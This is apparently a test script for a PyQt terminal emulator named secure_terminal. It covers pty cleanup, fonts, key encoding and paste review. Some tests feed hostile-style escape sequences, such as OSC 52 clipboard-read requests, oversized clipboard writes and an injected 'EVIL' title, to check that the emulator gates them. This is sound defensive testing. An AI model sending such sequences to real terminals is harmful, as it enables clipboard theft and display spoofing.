_rp, _wp = os.pipe()
os.close(_rp)
os.close(_wp)
if _sd._fd is not None:
    os.close(_sd._fd)
_sd._fd = _rp                               # already closed -> os.close raises
_sd._pid = 999999                           # no such pid -> kill/waitpid raise
_sd.shutdown()
ok(_sd._fd is None and _sd._pid is None,
   'shutdown: tolerates a closed fd and a dead pid')

# _write is a safe no-op with no fd, and drops output on a closed fd
_wt2 = SecureTerminal(command='/bin/cat')
if _wt2._fd is not None:
    os.close(_wt2._fd)
_wt2._fd = None
_wt2._write(b'x')                           # no fd -> return
_rp2, _wp2 = os.pipe()
os.close(_rp2)
os.close(_wp2)
_wt2._fd = _wp2                             # closed fd -> os.write OSError -> dropped
_wt2._write(b'x')
ok(True, '_write: safe no-op with no fd, and drops output on a closed fd')

# cwd / foreground helpers survive an OS error reading /proc
_cw = SecureTerminal(command='/bin/cat')
_o_readlink = _os.readlink
_o_getpgid = _os.getpgid
# Force a deterministic, truthy foreground pgrp so the readlink/getpgid fault-
# injections below are ALWAYS reached: a freshly-spawned cat's tcgetpgrp can briefly
# be unset (the setsid race), which would skip these defensive except branches. The
# cat's real _pid is left intact (non-None) so has_foreground_program reaches getpgid.
_cw._foreground_pgrp = lambda: os.getpid()


def _raise_os(*_a, **_k):
    raise OSError('injected')


try:
    _os.readlink = _raise_os
    ok(_cw.cwd_basename() is None, 'cwd_basename: a /proc read error -> None')
    _os.getpgid = lambda *_a, **_k: (_ for _ in ()).throw(ProcessLookupError())
    ok(not _cw.has_foreground_program(),
       'has_foreground_program: a reaped shell (getpgid fails) -> False')
finally:
    _os.readlink = _o_readlink
    _os.getpgid = _o_getpgid

# cwd_basename: the home directory renders as '~'
_cw2 = SecureTerminal(command='/bin/cat')
_cw2._pid = 1
_cw2._foreground_pgrp = lambda: None
try:
    _os.readlink = lambda *_a, **_k: os.path.expanduser('~')  # type: ignore[assignment]
    eq(_cw2.cwd_basename(), '~', 'cwd_basename: the home directory shows as ~')
finally:
    _os.readlink = _o_readlink

# --- a few testable feature branches ------------------------------------------
# _raw scrollback is capped (drop the oldest) when it overflows
_rw = SecureTerminal(command='/bin/cat')
_rw._raw = 'x' * (_rw._RAW_MAX + 10)
_rw._echo_caret('^C')
ok(len(_rw._raw) <= _rw._RAW_MAX, '_echo_caret caps the retained raw output')
## A3: Close _rw instance after one-shot use to prevent pty child leak
_rw.close()

# createMimeDataFromSelection returns a mime object
_ms = SecureTerminal(command='/bin/cat')
_ms._append('hello world')
_ms.selectAll()
ok(_ms.createMimeDataFromSelection() is not None,
   'createMimeDataFromSelection returns the selection as mime data')

# a double-click NOT on a marking falls through to the base handler
_dc2 = SecureTerminal(command='/bin/cat')
_dc2._append('plain')
_dbl2 = QMouseEvent(QEvent.Type.MouseButtonDblClick, QPointF(1, 1),
                    Qt.MouseButton.LeftButton, Qt.MouseButton.LeftButton,
                    Qt.KeyboardModifier.NoModifier)
_dc2.mouseDoubleClickEvent(_dbl2)
ok(True, 'double-click off a marking uses the default handler')

# --- OSC colour + clipboard-read handling -------------------------------------
_oc = SecureTerminal(command='/bin/cat')
eq(_oc._parse_osc_color(b'rgb:ab/cd/ef'), '#abcdef', 'OSC colour rgb: form parsed')
eq(_oc._parse_osc_color(b'#123456'), '#123456', 'OSC colour #hex form parsed')
eq(_oc._parse_osc_color(b'red'), '#ff0000', 'OSC colour name parsed')
ok(_oc._parse_osc_color(b'not-a-colour') is None, 'OSC colour: garbage -> None')
_oc._osc_color(4, b'1;rgb:ff/00/00')        # a valid palette override
ok(_oc._osc_palette.get(1) == '#ff0000', 'OSC 4 sets a palette index')
_oc._osc_color(4, b'no-semicolon')          # malformed -> ignored
_oc._osc_color(4, b'x;rgb:00/00/00')        # non-digit index -> ignored
_oc._osc_color(10, b'rgb:00/ff/00')         # default fg
_oc._osc_color(11, b'rgb:00/00/ff')         # default bg
_oc._osc_color(12, b'rgb:ff/ff/00')         # cursor
_oc._osc_color(10, b'garbage')              # unparseable -> ignored
ok('fg' in _oc._osc_palette and 'bg' in _oc._osc_palette,
   'OSC 10/11/12 override the default fg/bg/cursor colours')
# the CURSOR must take its colour from OSC 12 ('cursor'), not OSC 10 ('fg'): fg is green
# above, cursor is yellow, so _cursor_color must be yellow (regression: it read 'fg').
from PyQt6.QtGui import QColor as _QC_cur                       # noqa: E402
ok(_oc._cursor_color() == _QC_cur('#ffff00'),
   'OSC 12 re-tints the cursor (not OSC 10 fg) -- _cursor_color reads the cursor slot')
## A3: Close _oc instance after one-shot use to prevent pty child leak
_oc.close()

# OSC 52 clipboard-read gating: off / approved / denied / global-always / ask-once. Each
# branch is VERIFIED to write (or NOT write) a real \x1b]52;c; reply -- asserting nothing
# let a denied-branch leak or an approved silent-fail pass unnoticed.
_ocw = spy_writes(_oc)
_has_read_reply = lambda: any(b'\x1b]52;c;' in _w for _w in _ocw)
_oc._osc['osc_clipboard_read'] = False
_ocw.clear(); _oc._osc_clipboard_read()     # feature off
ok(not _has_read_reply(), 'OSC 52 read: feature OFF replies nothing (no clipboard exfil)')
_oc._osc['osc_clipboard_read'] = True
_oc._clipboard_read = True
_oc._last_clip_read = 0                      # clear the anti-flood rate-limit for this reply
_ocw.clear(); _oc._osc_clipboard_read()     # approved
ok(_has_read_reply(), 'OSC 52 read: an APPROVED tab replies with the clipboard')
_oc._clipboard_read = False
_ocw.clear(); _oc._osc_clipboard_read()     # denied
ok(not _has_read_reply(), 'OSC 52 read: a DENIED tab replies nothing (no exfil)')
_oc._clipboard_read = None
_oc._clipboard_read_always = True
_oc._last_clip_read = 0                      # clear the rate-limit again (else this is throttled)
_ocw.clear(); _oc._osc_clipboard_read()     # global always-allow
ok(_has_read_reply(), 'OSC 52 read: global always-allow replies')
_oc._clipboard_read = None
_oc._clipboard_read_always = False
_ocw.clear()
_creq2: list[int] = []
_oc.clipboard_read_requested.connect(lambda: _creq2.append(1))
_oc._osc_clipboard_read()                   # ask once -> raise the request, no reply yet
ok(_creq2 and _oc._clipboard_read == 'pending' and not _has_read_reply(),
   'OSC 52 read: an un-granted tab asks once and never replies')

# feed guards: no pyte stream (line mode), an empty chunk, alt-leave with no save
_lm = SecureTerminal(command='/bin/cat')    # line mode -> _stream is None
_lm._feed_stream(b'anything')
_oc._feed_bytes(b'')
_oc._alt_leave()                            # _alt_saved is None -> returns
ok(True, 'feed guards: no stream, empty chunk and alt-leave-without-save are safe')

# --- more terminal branches ----------------------------------------------------
import fcntl as _fcntl                                          # noqa: E402
from PyQt6.QtGui import QHelpEvent                              # noqa: E402
from PyQt6.QtCore import QPoint                                 # noqa: E402

# apply_zoom while in grid mode schedules a repaint
_gz = SecureTerminal(command='/bin/cat')
_gz.apply_tui(True)
feed_output(_gz, b'\x1b[?1049h')            # alt screen -> grid mode
_gz.apply_zoom(150)
ok(_gz.current_zoom() == 150, 'apply_zoom in grid mode applies the zoom level')

# _set_winsize: no-fd short-circuit and an ioctl error are both swallowed
_sw = SecureTerminal(command='/bin/cat')
_sw._set_winsize(80, 24)                     # succeeds on a real pty
_sw._set_winsize(70000, 70000)               # oversized: clamped to 0xFFFF, no struct.error (#9)
_o_ioctl = _fcntl.ioctl
try:
    _fcntl.ioctl = lambda *_a, **_k: (_ for _ in ()).throw(OSError())
    _sw._set_winsize(80, 24)                 # ioctl raises -> swallowed
finally:
    _fcntl.ioctl = _o_ioctl
_sw._fd = None
_sw._set_winsize(80, 24)                     # no fd -> return
ok(True, '_set_winsize tolerates a closed pty and an ioctl error')

# apply_markings toggles and re-renders only on a real change
_am = SecureTerminal(command='/bin/cat')
_am_was = _am.markings_enabled()
_am.apply_markings(not _am_was)
ok(_am.markings_enabled() == (not _am_was),
   'apply_markings toggles the markings state on a change')

# _end_sync_update is a no-op when no synchronized update is open
_es = SecureTerminal(command='/bin/cat')
_es._end_sync_update()
ok(True, '_end_sync_update: nothing open -> no-op')

# _render_tui is a no-op with no pyte screen (line mode)
_rt2 = SecureTerminal(command='/bin/cat')
_rt2._render_tui()
ok(True, '_render_tui: no screen -> no-op')

# _on_readable swallows a spurious EAGAIN (non-blocking read not ready)
_or = SecureTerminal(command='/bin/cat')
_o_read = _os.read
try:
    _os.read = lambda *_a, **_k: (_ for _ in ()).throw(BlockingIOError())
    _or._on_readable()                       # EAGAIN -> return, no crash
finally:
    _os.read = _o_read
ok(True, '_on_readable: a not-ready non-blocking fd is handled')

# PageUp/PageDown scroll the scrollback (line mode)
_pg = SecureTerminal(command='/bin/cat')
_pg.resize(600, 200)
_pg.show()
for _pgi in range(200):
    _pg._append('pgline %d\n' % _pgi)
_pgbar = _pg.verticalScrollBar()
_pg_bottom = _pgbar.value()                  # at the bottom after the output
key(_pg, Qt.Key.Key_PageUp)
_pg_up = _pgbar.value()
key(_pg, Qt.Key.Key_PageDown)
ok(_pg_up < _pg_bottom and _pgbar.value() > _pg_up,
   'PageUp/PageDown drive the scrollbar (up, then back down)')

# in TUI mode a plain key is encoded as VT input (keyPressEvent -> _tui_key)
_tk2 = SecureTerminal(command='/bin/cat')
_tk2.apply_tui(True)
_tks2 = spy_writes(_tk2)
key(_tk2, Qt.Key.Key_A, 'a')
ok(_tks2 == [b'a'], 'TUI mode: keyPressEvent routes a plain key through _tui_key')

# a MODIFIED cursor/End key is CSI-encoded so the child sees the modifier -- e.g.
# claude-code's Ctrl+End "jump to bottom" (ESC[1;5F). Bare End stays ESC[F.
_tkm = SecureTerminal(command='/bin/cat')
_tkm.apply_tui(True)
_tkms = spy_writes(_tkm)
key(_tkm, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ControlModifier)
key(_tkm, Qt.Key.Key_End, mods=Qt.KeyboardModifier.ShiftModifier)
key(_tkm, Qt.Key.Key_Up, mods=Qt.KeyboardModifier.ControlModifier)
key(_tkm, Qt.Key.Key_End)
eq(_tkms, [b'\x1b[1;5F', b'\x1b[1;2F', b'\x1b[1;5A', b'\x1b[F'],
   'TUI: a modified cursor/End key is CSI-encoded (Ctrl+End=ESC[1;5F); bare End=ESC[F')

# a tooltip over empty space (no codepoint) hides any tip
_tt = SecureTerminal(command='/bin/cat')
_hv = QHelpEvent(QEvent.Type.ToolTip, QPoint(3, 3), _tt.mapToGlobal(QPoint(3, 3)))
_tt.event(_hv)
ok(True, 'a tooltip over empty space hides the tip without error')

# stop any repeating timers these grid/TUI terminals started, so they do not
# fire into the offscreen platform's static teardown (which would crash a
# process that has otherwise passed cleanly)
for _tstop in (_gz, _tk2, _rt2, _es, _am):
    for _tmr in ('_render_timer', '_sync_timer'):
        _t = getattr(_tstop, _tmr, None)
        if _t is not None:
            _t.stop()

# --- terminfo source lookup ---------------------------------------------------
from secure_terminal.terminal import _terminfo_source           # noqa: E402
ok(_terminfo_source() is None or isinstance(_terminfo_source(), str),
   '_terminfo_source resolves a path or returns None')

# createMimeDataFromSelection with no selection delegates to the base handler
_nm = SecureTerminal(command='/bin/cat')
_nm.moveCursor(QTextCursor.MoveOperation.End)
ok(_nm.createMimeDataFromSelection() is not None,
   'copy with no selection delegates to the base handler')

# terminate_foreground: refuses our own group; only-the-shell is a no-op; killpg error -> False
# refuses to signal secure-terminal's OWN process group (defensive self-kill guard).
_tfo = SecureTerminal(command='/bin/cat')
_tfo._pid = os.getpid()
_tfo._foreground_pgrp = lambda: os.getpgrp()
ok(not _tfo.terminate_foreground(),
   'terminate_foreground: refuses to signal our own process group')
_tfo.close()
# only the shell in the foreground (login shell, fg pgrp == the shell's own pgrp,
# in a session of its own so it is NOT our group) -> a no-op that signals nothing.
_tfs = _subprocess.Popen(['sleep', '30'], start_new_session=True)
pump(60)
_tfw = SecureTerminal(command='/bin/cat')
_tfw._command = None                        # login-shell semantics for this branch
_tfw._pid = _tfs.pid
# Align the exe baseline to the stand-in child: a real login shell's _spawn_exe matches
# its own _pid, so _child_execd() reads "not exec'd" (a bare prompt). Without this, _pid
# points at 'sleep' while _spawn_exe is still '/bin/cat' -- an artificial mismatch that
# #35/#42's exec detection would (correctly) read as an exec-replace.
_tfw._spawn_exe = _tfw._read_exe(_tfs.pid)
_tfw._foreground_pgrp = lambda: os.getpgid(_tfs.pid)
ok(not _tfw.terminate_foreground(),
   'terminate_foreground: only the shell in the foreground -> no-op')
ok(_tfs.poll() is None,
   'terminate_foreground: the shell no-op signals nothing')
_tfw.close()
_tfs.terminate()
_tfs.wait()
# a killpg error (invalid pgrp) is reported as False.
_tf2w = SecureTerminal(command='/bin/cat')
_tf2w._pid = None
_tf2w._foreground_pgrp = lambda: 999999     # invalid pgrp -> killpg raises
ok(not _tf2w.terminate_foreground(),
   'terminate_foreground: a killpg error is reported as False')
_tf2w.close()

# _write retries after an EAGAIN on the non-blocking fd
_we = SecureTerminal(command='/bin/cat')
_wstate = {'n': 0}
_o_write2 = _os.write


def _flaky_write(fd, data):
    _wstate['n'] += 1
    if _wstate['n'] == 1:
        raise BlockingIOError()             # first call: kernel buffer not ready
    return _o_write2(fd, data)


try:
    _os.write = _flaky_write
    _we._write(b'hi')
finally:
    _os.write = _o_write2
ok(_wstate['n'] >= 2, '_write retries after an EAGAIN on the non-blocking fd')

# the grid-mode feed path caps the retained raw output
_bg = SecureTerminal(command='/bin/cat')
_bg.apply_tui(True)
feed_output(_bg, b'\x1b[?1049h')            # grid mode
_bg._raw = 'x' * _bg._RAW_MAX               # already at the cap
feed_output(_bg, b'y')                      # one more byte -> over cap -> trimmed
ok(len(_bg._raw) <= _bg._RAW_MAX, 'grid-mode feed caps the retained raw output')
_bg._render_timer.stop()
_bg._sync_timer.stop()

# --- OSC 52 clipboard WRITE (_osc_clipboard) ----------------------------------
import base64 as _b64                                           # noqa: E402
_ow = SecureTerminal(command='/bin/cat')
_ow._osc['osc_clipboard'] = True
# Each REJECT branch must leave the clipboard untouched (a sentinel), and only the valid
# base64 may write -- an ok(True) let an oversized/bad-base64 accept-and-write pass.
_owclip = QGuiApplication.clipboard()
_owclip.setText('SENTINEL')
_ow._osc_clipboard(b'no-semicolon')                             # malformed -> ignored
ok(_owclip.text() == 'SENTINEL', 'OSC 52 write: a malformed (no ";") sequence does not write')
_ow._osc_clipboard(b'c;?')                                      # read/clear query -> declined
ok(_owclip.text() == 'SENTINEL', 'OSC 52 write: a c;? read/clear query does not write')
_ow._osc_clipboard(b'c;' + b'A' * 200000)                       # oversized -> declined
ok(_owclip.text() == 'SENTINEL', 'OSC 52 write: an oversized payload is declined, not written')
_ow._osc_clipboard(b'c;!!!not-base64!!!')                       # bad base64 -> ignored
ok(_owclip.text() == 'SENTINEL', 'OSC 52 write: an invalid-base64 payload is ignored')
_ow._osc_clipboard(b'c;' + _b64.b64encode(b'hello'))            # valid -> set clipboard
ok(_owclip.text() == 'hello', 'OSC 52 write: only a valid base64 payload sets the clipboard')

# _on_readable creates the pyte screen on demand in TUI mode
_mkw = SecureTerminal(command='/bin/cat')
_mkw.apply_tui(True)
_mkw._screen = None
feed_output(_mkw, b'hi')                    # tui_active + no screen -> _make_screen
ok(_mkw._screen is not None, '_on_readable builds the pyte screen on demand in TUI mode')
_mkw._render_timer.stop()
_mkw._sync_timer.stop()

# _place_grid_cursor is a no-op when the program hid the cursor
_pc = SecureTerminal(command='/bin/cat')
_pc.apply_tui(True)
feed_output(_pc, b'x')
ok(_pc._screen is not None, '_place_grid_cursor test built a pyte screen')
_pc._place_grid_cursor(_pc._screen)          # place the caret once, visible
_pc_pos = _pc.textCursor().position()
_pc._screen.cursor.hidden = True
_pc._screen.cursor.x = (_pc._screen.cursor.x + 3) % _pc._screen.columns   # program MOVES it
_pc._place_grid_cursor(_pc._screen)          # hidden -> must NOT follow the move
ok(_pc.textCursor().position() == _pc_pos and _pc._cursor_visible is False,
   '_place_grid_cursor leaves a hidden cursor where it was (caret unmoved, ours suppressed)')
_pc._render_timer.stop()
_pc._sync_timer.stop()

# the escape-drop (line mode) path also caps the retained raw output
_ed = SecureTerminal(command='/bin/cat')
_ed._raw = 'x' * _ed._RAW_MAX
feed_output(_ed, b'\x1b]0;title\x07z')      # an OSC the line-mode path drops
ok(len(_ed._raw) <= _ed._RAW_MAX, 'the escape-drop path caps the retained raw output')

# _terminfo_source returns None when no candidate file exists
_o_isfile = _os.path.isfile
try:
    _os.path.isfile = lambda _p: False  # type: ignore[assignment]
    ok(_terminfo_source() is None,
       '_terminfo_source: no candidate on disk -> None')
finally:
    _os.path.isfile = _o_isfile

# sound_file_allowed swallows a realpath OS error
_o_realpath = _os.path.realpath
try:
    _os.path.realpath = lambda *_a, **_k: (_ for _ in ()).throw(OSError())
    ok(not _term.sound_file_allowed('/some/path.wav'),
       'sound_file_allowed: a realpath error -> rejected, not raised')
finally:
    _os.path.realpath = _o_realpath

# _write bails out once its 2s deadline passes (a child that never drains input)
_wd = SecureTerminal(command='/bin/cat')
import time as _time                                            # noqa: E402
_o_write3 = _os.write
_o_mono = _time.monotonic
_mono_calls = {'n': 0}


def _mono_jump():
    _mono_calls['n'] += 1
    return 0.0 if _mono_calls['n'] == 1 else 100.0   # base, then past the deadline


try:
    _os.write = lambda *_a, **_k: (_ for _ in ()).throw(BlockingIOError())
    _time.monotonic = _mono_jump
    _wd_ret = _wd._write(b'z')              # always EAGAIN + deadline passed -> bail
finally:
    _os.write = _o_write3
    _time.monotonic = _o_mono
# Teeth (not a bare ok(True)): the bail returns False (distinct from True=all-written),
# and the deadline is BOTH set and checked via monotonic, so the mock is consulted at
# least twice. A refactor switching _write's clock source leaves _mono_calls at 0 and
# trips the second assert instead of passing with a dead mock.
ok(_wd_ret is False,
   '_write returns False (deadline bail), not True (all bytes written)')
ok(_mono_calls['n'] >= 2,
   '_write consulted the mocked monotonic clock to set AND check its 2s deadline')

# --- terminfo directory: build-time entry, and tic-compiled on demand ---------
from secure_terminal.sanitize import MARK_KEY as _MK            # noqa: E402
# BOTH entries: cli_terminfo_dir only accepts a compilation that carries the
# -noedit entry too, because _child_term hands that TERM to the child on the
# strength of this probe -- a dir with just the base entry gave the shell a TERM
# with no compiled entry at all.
_TISRC = ('secure-terminal|test term,\n\tam,\n\tcols#80,\n\n'
          'secure-terminal-noedit|test term append-only,\n'
          '\tuse=secure-terminal,\n')
_o_ts = _term._terminfo_source
_o_cache = os.environ.get('XDG_CACHE_HOME')
try:
    # a compiled entry shipped next to the source is used directly
    _ti = tempfile.mkdtemp()
    with open(os.path.join(_ti, 'secure-terminal.ti'), 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    os.makedirs(os.path.join(_ti, 's'))
    for _name in ('secure-terminal', 'secure-terminal-noedit'):
        with open(os.path.join(_ti, 's', _name), 'w', encoding='utf-8') as _f:
            _f.write('x')
    _term._terminfo_source = lambda: os.path.join(_ti, 'secure-terminal.ti')
    eq(_term.cli_terminfo_dir(), _ti,
       'cli_terminfo_dir: a build-time compiled entry is used as-is')
    # ...but a compilation carrying ONLY the base entry is NOT usable: line_edits
    # off would hand the child a TERM that does not resolve.
    os.remove(os.path.join(_ti, 's', 'secure-terminal-noedit'))
    os.environ['XDG_CACHE_HOME'] = tempfile.mkdtemp()
    ok(_term.cli_terminfo_dir() != _ti,
       'cli_terminfo_dir: a half compilation (no -noedit entry) is rejected')
    with open(os.path.join(_ti, 's', 'secure-terminal-noedit'), 'w',
              encoding='utf-8') as _f:
        _f.write('x')
    # otherwise it compiles the source into the user cache with tic
    _ti2 = tempfile.mkdtemp()
    _src2 = os.path.join(_ti2, 'secure-terminal.ti')
    with open(_src2, 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    os.environ['XDG_CACHE_HOME'] = tempfile.mkdtemp()
    _term._terminfo_source = lambda: _src2
    ok(_term.cli_terminfo_dir() is not None,
       'cli_terminfo_dir: compiles the terminfo via tic on demand')
    # when the cache directory cannot even be created (its parent is a file), the
    # compile step raises and it falls back to None
    _ti3 = tempfile.mkdtemp()
    _src3 = os.path.join(_ti3, 'secure-terminal.ti')
    with open(_src3, 'w', encoding='utf-8') as _f:
        _f.write(_TISRC)
    _blk = os.path.join(_ti3, 'blocker')
    with open(_blk, 'w', encoding='utf-8') as _f:
        _f.write('x')
    os.environ['XDG_CACHE_HOME'] = os.path.join(_blk, 'sub')   # parent is a file
    _term._terminfo_source = lambda: _src3
    ok(_term.cli_terminfo_dir() is None,
       'cli_terminfo_dir: an un-creatable cache dir falls back to None')
finally:
    _term._terminfo_source = _o_ts
    if _o_cache is None:
        os.environ.pop('XDG_CACHE_HOME', None)
    else:
        os.environ['XDG_CACHE_HOME'] = _o_cache

# _sync_display: re-entering grid mode with a cleared screen rebuilds it
_sd = SecureTerminal(command='/bin/cat')
_sd.apply_tui(True)
_sd._grid_shown = True
_sd._screen = None
_sd._sync_display()
ok(_sd._screen is not None, '_sync_display rebuilds a cleared pyte screen')
_sd._render_timer.stop()
_sd._sync_timer.stop()

# _delete_grid with scrollback above the live grid also eats the joining newline
_dg = SecureTerminal(command='/bin/cat')
_dg._append('l1\nl2\nl3\nl4\nl5')
_dg_bc = _dg.document().blockCount()
_dg._grid_rows = 2
_dg._delete_grid()
ok(_dg.document().blockCount() == _dg_bc - 2
   and 'l5' not in _dg.toPlainText() and 'l4' not in _dg.toPlainText()
   and _dg.toPlainText().endswith('l3'),
   '_delete_grid removes the 2 live grid rows AND the newline joining them (no blank tail)')

# _fmt_from_key: a marking carrying no colour yields a plain format
_ff = SecureTerminal(command='/bin/cat')
ok(_ff._fmt_from_key((_MK, (), 0x41)) is not None,
   '_fmt_from_key: a colourless marking -> a plain format')

# --- font: secure default + fixed-pitch fallback chain + per-tab set ----------
from secure_terminal.terminal import DEFAULT_FONT_FAMILY as _DFF   # noqa: E402
from PyQt6.QtGui import QFont as _QFont                            # noqa: E402
eq(_DFF, 'Hack', 'default font family is Hack (confusable-disambiguating, no ligatures)')
_fnt = SecureTerminal(command='/bin/cat')
eq(_fnt.current_font_family(), 'Hack', 'a new terminal starts on the default font family')
eq(_fnt.font().family(), 'Hack',
   'the terminal uses the chosen family (Hack is a hard dependency; no fallback list)')
ok(_fnt.font().styleHint() == _QFont.StyleHint.Monospace and _fnt.font().fixedPitch(),
   'the terminal font is fixed-pitch monospace (steers Qt substitution; no proportional pick)')
_fnt.set_font_family('JetBrains Mono')
eq(_fnt.current_font_family(), 'JetBrains Mono', 'set_font_family switches the tab font')
ok(_fnt.font().families()[:1] == ['JetBrains Mono'], 'the new family is applied to the widget')
_fnt.set_font_family('   ')
eq(_fnt.current_font_family(), 'Hack', 'an empty/whitespace family falls back to the default')
_fnt.set_font_family('IBM Plex Mono')
_fnt.apply_zoom(150)
eq(_fnt.current_font_family(), 'IBM Plex Mono', 'a zoom change preserves the chosen family')
# base font size: settable, clamped to a readable range, and scaled by the zoom.
_fnt.apply_zoom(100)
_fnt.set_font_size(16)
eq(_fnt.current_font_size(), 16, 'set_font_size sets the base point size')
eq(_fnt.font().pointSize(), 16, 'the base size reaches the widget font at 100% zoom')
_fnt.set_font_size(100000)
eq(_fnt.current_font_size(), 72, 'an oversized font size is clamped to the max')
_fnt.set_font_size(0)
eq(_fnt.current_font_size(), 6, 'a tiny font size is clamped to the min')

# --- keyPressEvent: a preview has no child, so keys defer to the base ----------
_pvk = SecureTerminal(preview=True)
_pvsent = spy_writes(_pvk)
key(_pvk, Qt.Key.Key_A, 'a')                 # preview branch: super() handles, nothing sent
ok(not _pvsent, 'keyPressEvent: a preview terminal sends nothing to a child')

# --- keyPressEvent while a paste review is held: input is suspended ------------
_rvk = SecureTerminal(command='/bin/cat')
_rvk.apply_paste_warn('always')
_rvksent = spy_writes(_rvk)
_rvmime = QMimeData()
_rvmime.setText('held paste')
_rvk.insertFromMimeData(_rvmime)             # -> review held, input suspended
ok(_rvk.review_pending(), 'a held paste suspends input for review')
key(_rvk, Qt.Key.Key_X, 'x')                 # a stray key is swallowed, never sent
ok(not _rvksent and _rvk.review_pending(),
   'keyPressEvent: a stray key during review is swallowed, not sent')
key(_rvk, Qt.Key.Key_Return)                 # Enter rejects the held paste (safe default)
ok(not _rvk.review_pending() and not _rvksent,
   'keyPressEvent: Enter during review rejects the held paste')
_rvk.shutdown()

# --- dispatch_pending_copy is a no-op when no copy review is pending -----------
_dpc = SecureTerminal(command='/bin/cat')
_dpc.dispatch_pending_copy('stripped')       # nothing pending -> early return
ok(True, 'dispatch_pending_copy: a no-op when no review is active')
_dpc.shutdown()

# --- contextMenuEvent builds the reviewed menu and shows it --------------------
from PyQt6.QtGui import QContextMenuEvent as _QCME               # noqa: E402
from PyQt6.QtWidgets import QMenu as _QMenu2                     # noqa: E402
_cme = SecureTerminal(command='/bin/cat')
_o_menuexec = _QMenu2.exec
_menu_shown = []
_QMenu2.exec = lambda *_a, **_k: _menu_shown.append(1)
try:
    _cev = _QCME(_QCME.Reason.Mouse, _QPoint(5, 5), _cme.mapToGlobal(_QPoint(5, 5)))
    _cme.contextMenuEvent(_cev)
    ok(_menu_shown == [1], 'contextMenuEvent builds and shows the reviewed context menu')
finally:
    _QMenu2.exec = _o_menuexec
_cme.shutdown()

# --- _reviewed_context_menu tolerates an already-disconnected copy action ------
from PyQt6.QtGui import QAction as _QAction2                     # noqa: E402
_rcm = SecureTerminal(command='/bin/cat')
_o_std = _rcm.createStandardContextMenu


def _fake_std(_pos=None):
    _fm = _QMenu2(_rcm)
    _fa = _QAction2('Copy', _fm)
    _fa.setObjectName('edit-copy')
    _fm.addAction(_fa)
    # drain the menu's own triggered connection so the reroute's disconnect()
    # finds nothing to disconnect -> the defensive TypeError path fires.
    try:
        _fa.triggered.disconnect()
    except TypeError:
        ## Nothing was connected, which is exactly the state this fixture wants:
        ## the reroute's own disconnect() then hits its defensive TypeError path.
        pass
    return _fm


_rcm.createStandardContextMenu = _fake_std
try:
    _m2 = _rcm._reviewed_context_menu(_QPoint(5, 5))
    ok(any(a.objectName() == 'edit-copy' for a in _m2.actions()),
       '_reviewed_context_menu tolerates an undisconnectable copy action')
finally:
    _rcm.createStandardContextMenu = _o_std
_rcm.shutdown()

# --- shutdown tolerates an already-disconnected readable notifier --------------
_sdn = SecureTerminal(command='/bin/cat')
if _sdn._notifier is not None:
    _sdn._notifier.activated.disconnect()    # pre-disconnect: shutdown's disconnect raises
_sdn.shutdown()                              # -> except (TypeError, RuntimeError): pass
ok(True, 'shutdown tolerates an already-disconnected readable notifier')

# --- _cp_at falls back to an untagged readable glyph's own codepoint -----------
# In show mode the render tags every non-ASCII cell with its source codepoint;
# a glyph inserted straight into the document (no tag) exercises the char-itself
# fallback in _cp_in_box.
_cpf = SecureTerminal(command='/bin/cat')
_cpf.apply_mode('show')
_cpfcur = _cpf.textCursor()
_cpfcur.insertText(chr(0x00E9) * 3)          # 'e-acute', inserted untagged (no _CP_PROP)
_cpf.resize(600, 200)
_cpf.show()
pump(30)
eq(_cpf._cp_at(glyph_pt(_cpf, 1)), 0x00E9,
   '_cp_at falls back to an untagged readable glyph own codepoint')
_cpf.shutdown()

# --- REGRESSION: an OSC title must never LATCH past the gate or a mode switch --
# pyte keeps the last title it ever parsed in screen.title, so reading that field
# adopts a title the tab was not showing titles for: one set while osc_title was
# off is picked up by the next unrelated OSC once the user enables it, and
# re-seeding the grid on a CLI->TUI switch replays every historical title out of
# the retained scrollback. The title must come from the bytes arriving NOW.
if tui_available():
    _lt = SecureTerminal(command='/bin/cat', tui=True)
    _lt_titles: list[str] = []
    _lt.title_changed.connect(_lt_titles.append)
    feed_output(_lt, b'\x1b]2;EVIL\x07')            # osc_title off by default
    eq(_lt_titles, [], 'a title arriving while osc_title is off emits nothing')
    _lt.apply_osc('osc_title', True)
    feed_output(_lt, b'ordinary output\r\n')
    eq(_lt_titles, [],
       'opening the title gate does not adopt the title latched while it was shut')
    feed_output(_lt, b'\x1b]7;file:///tmp\x07')     # an unrelated OSC
    eq(_lt_titles, [],
       'an unrelated OSC does not flush the title latched while the gate was shut')
    feed_output(_lt, b'\x1b]2;GOOD\x07')
    eq(_lt_titles, ['GOOD'], 'a title arriving while the gate is OPEN is adopted')
    _lt.shutdown()

    # ...and the same title replayed out of the CLI scrollback when the grid is
    # seeded on a mode switch is not adopted either.
    _ls = SecureTerminal(command='/bin/cat')          # starts in CLI mode
    _ls.apply_osc('osc_title', True)
    _ls_titles: list[str] = []
    _ls.title_changed.connect(_ls_titles.append)
    feed_output(_ls, b'\x1b]2;STALE\x07hello\r\n')
    eq(_ls_titles, [], 'CLI mode adopts no program title at all')
    ok(_ls.apply_tui(True), 'the tab switches to TUI mode')
    feed_output(_ls, b'more output\r\n')
    eq(_ls_titles, [],
       'seeding the TUI grid does not adopt a title replayed from the scrollback')
    _ls.shutdown()

# --- REGRESSION: capping the retained raw output must not cut mid-escape -------
# _raw is bounded by keeping its tail; a plain slice can land inside a sequence
# and the introducer-less remainder then renders as literal text on the next mode
# re-render (and mis-parses when the grid is seeded).
_cr = SecureTerminal(command='/bin/cat')
_cr._RAW_MAX = 11              # so the cap lands INSIDE the SGR below
_cr._RERENDER_TAIL = 11
feed_output(_cr, b'A' * 30 + b'\x1b[31mHELLO\r\n')
_cr.apply_mode('show')                       # re-renders from the capped tail
_cr_text = _cr.toPlainText()
ok('31m' not in _cr_text and '[31' not in _cr_text,
   'a capped raw buffer re-renders with no half-escape leaking as literal text')
ok('HELLO' in _cr_text, 'the surviving tail of the capped buffer still renders')
_cr.shutdown()

# --- REGRESSION: the caret offset is in DOCUMENT units, not code points --------
# A Qt document position counts UTF-16 units, so an astral glyph (Show mode passes
# emoji through) is ONE Python character but TWO positions; counting code points
# left the caret one place short for every astral character before it.
_ac2 = SecureTerminal(command='/bin/cat')
_ac2.apply_mode('show')
feed_output(_ac2, 'A\U0001f600B'.encode('utf-8'))
eq(_ac2.textCursor().position(), _ac2.document().characterCount() - 1,
   'the caret lands at the true end of the line after an astral glyph')
_ac2.shutdown()

